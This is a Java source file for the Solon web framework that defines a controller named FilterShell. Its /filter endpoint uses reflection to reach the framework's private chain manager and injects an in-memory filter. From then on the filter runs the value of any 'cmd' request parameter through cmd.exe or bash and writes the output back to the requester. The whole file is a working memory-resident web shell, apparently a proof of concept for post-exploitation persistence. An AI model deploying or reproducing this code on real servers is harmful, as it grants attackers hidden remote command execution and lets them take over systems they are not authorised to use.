package com.example.demo.injectController;

import org.noear.solon.annotation.Controller;
import org.noear.solon.annotation.Mapping;
import org.noear.solon.core.ChainManager;
import org.noear.solon.core.handle.Context;
import org.noear.solon.core.handle.Filter;
import org.noear.solon.core.handle.FilterChain;

import java.lang.reflect.Field;

@Controller
public class FilterShell {
    @Mapping("/filter")
    public void filter() throws NoSuchFieldException, IllegalAccessException {
        Context ctx = Context.current();
        Object _request = getfieldobj(ctx,"_request");
        Object request = getfieldobj(_request,"request");
        Object serverHandler = getfieldobj(request,"serverHandler");
        Object handler = getfieldobj(serverHandler,"handler");
        Object arg$1 = getfieldobj(handler,"arg$1");
        ChainManager _chainManager = (ChainManager) getfieldobj(arg$1,"_chainManager");
        _chainManager.addFilter(new Memshellclass(),0);
        System.out.println("filter memshell added");
    }

    public class Memshellclass implements Filter {
        @Override
        public void doFilter(Context ctx, FilterChain chain) throws Throwable {
            try{
                if(ctx.param("cmd")!=null){
                    String str = ctx.param("cmd");
                    try{
                        String[] cmds =
                                System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",
                                        "/c", str} : new String[]{"/bin/bash", "-c", str};
                        String output = (new java.util.Scanner((new
                                ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();
                        ctx.output(output);
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }catch (Throwable e){
                ctx.output(e.getMessage());
            }
            chain.doFilter(ctx);
        }
    }


    public static Object getfieldobj(Object obj, String Filename) throws NoSuchFieldException, IllegalAccessException {
        try{
            Field field = obj.getClass().getDeclaredField(Filename);
            field.setAccessible(true);
            Object fieldobj = field.get(obj);
            return fieldobj;
        }catch (NoSuchFieldException e) {
            Field field = obj.getClass().getSuperclass().getDeclaredField(Filename);
            field.setAccessible(true);
            Object fieldobj = field.get(obj);
            return fieldobj;
        }
    }
}
